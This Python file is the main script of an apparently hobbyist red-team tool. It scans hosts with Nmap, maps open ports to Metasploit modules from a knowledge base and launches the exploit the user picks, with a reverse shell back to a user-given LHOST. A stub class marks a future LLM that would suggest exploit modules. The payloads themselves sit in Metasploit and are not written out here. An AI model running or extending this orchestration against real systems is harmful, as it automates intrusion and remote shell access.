import yaml
import sys
import subprocess
import socket
import time
from scanner_nmap import NmapScanner
from msf_rpc import MetasploitRPC
from reporter import Reporter

# Placeholder for future AI integration (RAG/LLM)
class AIBrain:
    def __init__(self, kb_path='knowledge_base.yml'):
        self.kb_path = kb_path
    
    def analyze_vulnerability(self, service, port, cves):
        """
        Future RAG Implementation:
        1. Vector search HackTricks for 'service'
        2. Feed results + CVEs to LLM
        3. Return exact Metasploit module suggestion
        """
        # For now, we pass. This keeps the tool runnable without LLM setup.
        return None

class AutoRedOps:
    def __init__(self):
        # Load Config
        try:
            with open('config.yaml', 'r') as f:
                self.config = yaml.safe_load(f)
            with open('knowledge_base.yml', 'r') as f:
                self.kb = yaml.safe_load(f)
        except FileNotFoundError:
            print("[-] Error: config.yaml or knowledge_base.yml not found!")
            sys.exit(1)

        # --- NEW: Auto-Start Metasploit RPC ---
        self.start_msf_rpc()

        # Initialize Modules
        self.scanner = NmapScanner()
        self.ai = AIBrain() # Initialize AI Brain
        
        try:
            self.rpc = MetasploitRPC()
            self.rpc_available = True
        except Exception as e:
            print(f"[-] Warning: Could not connect to Metasploit: {e}")
            print("[-] Exploitation features will be disabled.")
            self.rpc_available = False
            
        self.reporter = Reporter(self.config)

    def start_msf_rpc(self):
        """
        Checks if MSF RPC is running. If not, starts it in the background.
        """
        rpc_host = self.config['metasploit']['host']
        rpc_port = self.config['metasploit']['port']
        rpc_user = self.config['metasploit']['user']
        rpc_pass = self.config['metasploit']['password']

        # Check if port is already open
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((rpc_host, rpc_port))
        sock.close()
        
        if result == 0:
            print(f"[*] Metasploit RPC is already running on port {rpc_port}.")
            return

        print(f"[*] Starting Metasploit RPC on {rpc_port}... (Please wait ~30s)")
        
        # Command to start msfrpcd
        # -n (Disable database), -S (Disable SSL for local ease, or keep enabled if config says so)
        # Note: Adjust flags based on your config.yaml SSL preference.
        cmd = f"msfrpcd -P {rpc_pass} -U {rpc_user} -n -S -a {rpc_host} -p {rpc_port}"
        
        try:
            # Start process detached
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait loop to ensure it's ready before code continues
            retries = 15
            while retries > 0:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if sock.connect_ex((rpc_host, rpc_port)) == 0:
                    print("[+] Metasploit RPC started successfully!")
                    sock.close()
                    return
                sock.close()
                time.sleep(2)
                print(f"[*] Waiting for RPC... ({retries})")
                retries -= 1
                
            print("[-] Warning: Metasploit RPC process started but port is not yet open.")
            
        except Exception as e:
            print(f"[-] Failed to auto-start Metasploit: {e}")

    def plan_attacks(self, scan_results):
        """
        Matches open ports/services to the Knowledge Base.
        """
        possible_attacks = []
        print("\n[*] Analyzing targets against Knowledge Base...")
        
        for port_info in scan_results['ports']:
            # 1. Standard KB Check (Legacy Mode)
            for exploit in self.kb['exploit_mappings']:
                if exploit.get('target_port') == int(port_info['port']):
                    possible_attacks.append({
                        'name': exploit['description'],
                        'module': exploit['msf_module'],
                        'payload': exploit['payload'],
                        'port': port_info['port'],
                        'service': port_info['service'],
                        'source': 'Static KB'
                    })
            
            # 2. AI Check (Future Mode)
            # This is where we will hook in the LLM later
            ai_suggestion = self.ai.analyze_vulnerability(
                port_info['service'], 
                port_info['port'], 
                port_info['cves']
            )
            if ai_suggestion:
                possible_attacks.append(ai_suggestion)
                    
        return possible_attacks

    def run(self):
        print("=== AutoRedOps: Automated Red Team Orchestrator ===")
        
        # 1. Target Selection
        target = input("\nEnter Target IP (leave blank to auto-discover): ").strip()
        
        if not target:
            hosts = self.scanner.discover_hosts()
            if not hosts:
                print("[-] No hosts found.")
                return
            print("\nDiscovered Hosts:")
            for i, host in enumerate(hosts):
                print(f"[{i}] {host}")
            choice = int(input("Select host number: "))
            target = hosts[choice]

        # 2. Scanning
        scan_data = self.scanner.scan_target(target)
        
        # 3. Attack Planning
        attacks = self.plan_attacks(scan_data)
        
        exploit_result = None
        
        if attacks and self.rpc_available:
            print(f"\n[+] Identified {len(attacks)} potential attack vectors:")
            for i, attack in enumerate(attacks):
                print(f"[{i+1}] {attack['name']} ({attack['module']}) - [{attack['source']}]")
            
            print("[0] Skip Exploitation")
            
            choice = int(input("\nSelect attack to execute: "))
            
            if choice > 0:
                selected_attack = attacks[choice-1]
                # Prepare data for RPC
                exploit_data = {
                    'msf_module': selected_attack['module'],
                    'payload': selected_attack['payload'],
                    'target_port': int(selected_attack['port'])
                }
                
                # We need our local IP (LHOST) for the reverse shell
                lhost = input("Enter your LHOST (your local IP for reverse shell): ")
                
                # Execute
                exploit_result = self.rpc.execute_exploit(exploit_data, target, lhost)
                exploit_result['module'] = selected_attack['module']
        
        # 4. Reporting
        self.reporter.generate_report(scan_data, exploit_result)
        print("\n[*] Mission Complete.")

if __name__ == "__main__":
    app = AutoRedOps()
    app.run()